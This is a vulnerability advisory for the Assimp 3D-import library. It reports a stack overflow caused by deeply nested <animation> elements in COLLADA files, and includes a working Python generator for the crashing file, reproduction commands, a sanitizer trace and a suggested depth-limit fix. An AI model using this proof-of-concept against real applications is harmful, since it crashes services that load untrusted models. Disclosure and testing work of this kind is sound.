Stack overflow via deeply nested <animation> elements in COLLADA files (ReadAnimation unbounded recursion)

## Summary

A stack overflow caused by unbounded recursion in `ColladaParser::ReadAnimation()` allows denial of service (and potential code execution) when Assimp processes a COLLADA file with deeply nested `<animation>` elements.

## Tested Version

- Latest release: v6.0.4
- Latest master: commit `158da575` (April 6, 2026)

## Details

`ColladaParser::ReadAnimation()` in `code/AssetLib/Collada/ColladaParser.cpp` (line 797) recursively calls itself when it encounters a child `<animation>` element. There is no depth limit on this recursion. A COLLADA file with ~5,000 levels of nested `<animation>` elements is sufficient to exhaust a default 8 MB stack.

The relevant code at line 797:

```cpp
for (XmlNode &currentNode : node.children()) {
    const std::string &currentName = currentNode.name();
    if (currentName == "animation") {
        // ...
        ReadAnimation(currentNode, anim);  // <-- unbounded recursion
    }
}
```

This is distinct from the `BuildHierarchy` circular reference bug (separate advisory); this crash happens during Collada XML structure parsing, before scene graph construction.

## PoC

1. Run the generator to create the PoC:
```python
import os

OUT = os.path.dirname(os.path.abspath(__file__))

def make_collada_animation_recursion(depth=5000):
    xml = '<?xml version="1.0"?>\n'
    xml += '<COLLADA xmlns="http://www.collada.org/2005/11/COLLADASchema" version="1.4.1">\n'
    xml += '<library_animations>\n'
    for i in range(depth):
        xml += f'<animation id="a{i}">\n'
    xml += '<source id="s"><float_array id="f" count="1">0</float_array></source>\n'
    for i in range(depth):
        xml += '</animation>\n'
    xml += '</library_animations>\n'
    xml += '</COLLADA>\n'

    out_path = os.path.join(OUT, "poc.dae")
    with open(out_path, "wb") as f:
        f.write(xml.encode())
    print(f"Written {len(xml)} bytes to {out_path} (depth={depth})")

if __name__ == "__main__":
    make_collada_animation_recursion(5000)
```

This produces `poc.dae`, a COLLADA file with 5,000 nested `<animation>` elements, each containing the next as a child.

2. Feed `poc.dae` to any application that uses Assimp to import COLLADA files.

```bash
# Option A: Build the CLI tool (no sanitizer — crashes as SIGSEGV)
cmake -B build -DASSIMP_BUILD_ASSIMP_TOOLS=ON -DASSIMP_BUILD_TESTS=OFF
cmake --build build -j$(nproc)
./build/bin/assimp info poc.dae     # → Segmentation fault

# Option B: Build with ASan for a cleaner trace
cmake -B build-asan -DCMAKE_C_FLAGS="-fsanitize=address" -DCMAKE_CXX_FLAGS="-fsanitize=address" \
      -DASSIMP_BUILD_ASSIMP_TOOLS=ON -DASSIMP_BUILD_TESTS=OFF
cmake --build build-asan -j$(nproc)
./build-asan/bin/assimp info poc.dae  # → AddressSanitizer: stack-overflow
```

With AddressSanitizer enabled, the crash is:

```
==7==ERROR: AddressSanitizer: stack-overflow on address 0x7ffdc4156ff8
    #5 0x...5d0 in strequal /src/assimp/contrib/pugixml/src/pugixml.cpp:251:10
    #6 0x...5d0 in pugi::xml_node::attribute(char const*) const pugixml.cpp:5725:17
    #7 0x...868 in getStdStrAttribute XmlParser.h:453:40
    #8 0x...868 in Assimp::ColladaParser::ReadAnimation(...) ColladaParser.cpp:777:10
    #9 0x...12e in Assimp::ColladaParser::ReadAnimation(...) ColladaParser.cpp:797:13
   #10 0x...12e in Assimp::ColladaParser::ReadAnimation(...) ColladaParser.cpp:797:13
   (... thousands of identical recursive frames ...)
SUMMARY: AddressSanitizer: stack-overflow pugixml.cpp:251:10 in strequal
```

Note: The top of the stack shows `strequal` in pugixml, but this is merely the leaf function executing when the stack limit was hit. The actual unbounded recursion is in `ColladaParser::ReadAnimation()` (frames #8–#N), which calls itself for every nested `<animation>` element.

## Impact

Denial of Service. Any application using Assimp to load untrusted COLLADA files can be crashed. Stack overflows may also be exploitable for arbitrary code execution depending on the platform and stack layout. Also crashes without sanitizers as a real `SIGSEGV`.

## Remediation

Add a maximum recursion depth parameter to `ReadAnimation()` and return a parse error when exceeded. A limit of 256 would accommodate any legitimate COLLADA animation hierarchy.